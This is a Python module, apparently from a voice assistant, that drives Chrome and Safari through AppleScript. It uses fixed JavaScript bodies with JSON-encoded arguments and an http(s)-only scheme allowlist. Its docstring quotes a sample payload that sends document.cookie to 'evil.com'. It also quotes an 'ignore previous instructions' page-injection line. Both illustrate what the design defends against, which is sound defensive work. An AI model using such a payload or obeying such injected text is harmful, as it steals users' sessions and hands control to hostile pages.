"""Drive the page, not the pixels.

Verified from each app's own `sdef` on 2026-08-15 rather than assumed::

    Chrome:  execute tab N javascript "…"    → runs JS, returns a result
             URL property of tab             → settable
    Safari:  do JavaScript … in document 1

and live on this machine::

    osascript -e 'tell application "Google Chrome" to execute front window's
                  active tab javascript "1+1"'          → 2

So page control needs no accessibility tree, no screenshot parsing and no
synthesised clicks. Reading a page, filling a field and clicking a button are
all one round trip through a language the browser already speaks.

**Two rules, both carried over from the AppleScript path because the failure
they prevent is identical.**

1. *Nothing user-supplied is spliced into source.* A search query is a
   transcript. Concatenating it into JavaScript is how
   ``"); fetch("//evil.com?c="+document.cookie); ("`` stops being a search and
   starts being code. Arguments are `json.dumps`'d into a fixed function body,
   so a hostile string is a **string**, not syntax.

2. *Schemes are an allowlist.* `javascript:` turns a navigate into an execute
   and `file:` turns it into a read of any file on disk, so only http and
   https may be navigated to.

There is a third thing worth knowing, and it is not defended here: **once
KAVACH reads a page, the page can talk to it.** A page containing "ignore
previous instructions and run …" is an injection attempt against the model,
not against this module. What contains it is `Policy`'s rule that every shell
command is read back to the user first — a page cannot make a command run
silently. See spec §4.2 before weakening that.
"""

from __future__ import annotations

import json
import logging
import urllib.parse

from ..reasoning.actions import OsascriptRunner
from .appinfo import canonical_name

log = logging.getLogger("kavach.hands.browser")

#: Only these may be navigated to. An allowlist, because the dangerous
#: schemes are not enumerable — `javascript:`, `file:`, `data:`, `vbscript:`
#: and whatever the next one turns out to be.
ALLOWED_SCHEMES = ("http", "https")

#: The browsers whose AppleScript dialect is known here. `canonical_name`
#: still has to agree the app is installed.
CHROMIUM = ("Google Chrome", "Brave Browser", "Microsoft Edge", "Chromium",
            "Arc", "Vivaldi", "Opera")
WEBKIT = ("Safari",)


def search_url(query: str, engine: str = "https://duckduckgo.com/?q=") -> str:
    """A search URL for `query`, percent-encoded.

    Encoding is the whole job: a query containing `&`, `#` or a quote must
    stay one parameter rather than becoming several, or becoming syntax.
    """
    return engine + urllib.parse.quote_plus(query or "")


# ═══ javascript, composed rather than concatenated ═══

#: Fixed function bodies. The **only** thing that varies is the JSON-encoded
#: argument object handed to them, so no caller can change the shape of the
#: code — only the data it operates on.
_OPERATIONS = {
    "read_text": "return document.body ? document.body.innerText : '';",
    "title": "return document.title;",
    "search": (
        "window.location.href = "
        "'https://duckduckgo.com/?q=' + encodeURIComponent(a.query); "
        "return 'navigating';"
    ),
    "click": (
        "var els = Array.from(document.querySelectorAll("
        "'a,button,input[type=submit],[role=button]')); "
        "var hit = els.find(function (e) { "
        "return (e.innerText || e.value || '').trim()"
        ".toLowerCase().includes(a.text.toLowerCase()); }); "
        "if (!hit) { return 'not found'; } hit.click(); return 'clicked';"
    ),
    "fill": (
        "var el = document.querySelector(a.selector); "
        "if (!el) { return 'not found'; } "
        "el.value = a.value; "
        "el.dispatchEvent(new Event('input', {bubbles: true})); "
        "return 'filled';"
    ),
}


def build_js(operation: str, args: dict | None = None) -> str:
    """One JavaScript expression for `operation`, with `args` as **data**.

    The arguments are JSON-encoded into a single object literal and the body
    is a constant. A caller cannot inject syntax because a caller never
    contributes syntax — only the contents of `a`.
    """
    body = _OPERATIONS.get(operation)
    if body is None:
        raise ValueError(f"unknown browser operation {operation!r}")
    payload = json.dumps(args or {}, ensure_ascii=True)
    return f"(function () {{ var a = {payload}; {body} }})()"


class Browser:
    """One browser, driven through AppleScript.

    `runner` is injected so the tests can exercise every path without opening
    a window — the same shape as `OsascriptRunner`/`FakeRunner` elsewhere.
    """

    def __init__(self, app: str, runner=None) -> None:
        name = canonical_name(app)
        if name is None:
            raise ValueError(f"{app!r} is not an application on this Mac")
        if name not in CHROMIUM and name not in WEBKIT:
            raise ValueError(
                f"{name!r} is not a browser this module knows how to drive"
            )
        self.app = name
        self.webkit = name in WEBKIT
        self.runner = runner if runner is not None else OsascriptRunner()

    # ——— the two dialects ———

    def _js_script(self, expression: str) -> str:
        """`expression` is composed by `build_js`, never by a caller.

        It is still escaped for AppleScript's own string syntax, because it
        must survive being *quoted inside* a script — a different layer from
        the injection rule, and both are needed.
        """
        quoted = expression.replace("\\", "\\\\").replace('"', '\\"')
        if self.webkit:
            return (f'tell application "{self.app}" to '
                    f'do JavaScript "{quoted}" in document 1')
        return (f'tell application "{self.app}" to execute '
                f"front window's active tab javascript \"{quoted}\"")

    def js(self, expression: str):
        """Run one JavaScript expression and return the runner's result."""
        return self.runner(self._js_script(expression))

    def run(self, operation: str, **args):
        return self.js(build_js(operation, args))

    # ——— navigation ———

    def navigate(self, url: str):
        """Open `url`. http and https only.

        `javascript:` would make this an arbitrary-execution primitive and
        `file:` would make it a read of anything on disk, so the scheme is
        checked against an allowlist before a script is built at all.
        """
        parsed = urllib.parse.urlparse((url or "").strip())
        if parsed.scheme.lower() not in ALLOWED_SCHEMES:
            raise ValueError(
                f"{url!r} is not an http(s) URL — refusing to navigate"
            )
        safe = json.dumps(parsed.geturl())          # data, not syntax
        if self.webkit:
            script = (f'tell application "{self.app}" to set URL of '
                      f"document 1 to {safe}")
        else:
            script = (f'tell application "{self.app}" to set URL of '
                      f"active tab of front window to {safe}")
        return self.runner(script)

    # ——— what the voice loop asks for ———

    def search(self, query: str):
        """Search for `query`, falling back to a plain navigation.

        **The fallback is the point.** `Allow JavaScript from Apple Events` is
        a manual toggle in both browsers and cannot be set programmatically,
        so `execute … javascript` fails until a human turns it on. Setting a
        tab's URL needs no toggle — which is why "open Chrome and search
        YouTube" works whether or not the user has been to the Developer menu.
        """
        result = self.run("search", query=query)
        if getattr(result, "ok", False):
            return result
        log.info("javascript unavailable in %s (%s) — using the URL instead",
                 self.app, getattr(result, "err", "") or "no error given")
        return self.navigate(search_url(query))

    def read_text(self) -> str:
        result = self.run("read_text")
        return (getattr(result, "out", "") or "") if getattr(result, "ok", False) else ""

    def click(self, text: str):
        return self.run("click", text=text)

    def fill(self, selector: str, value: str):
        return self.run("fill", selector=selector, value=value)
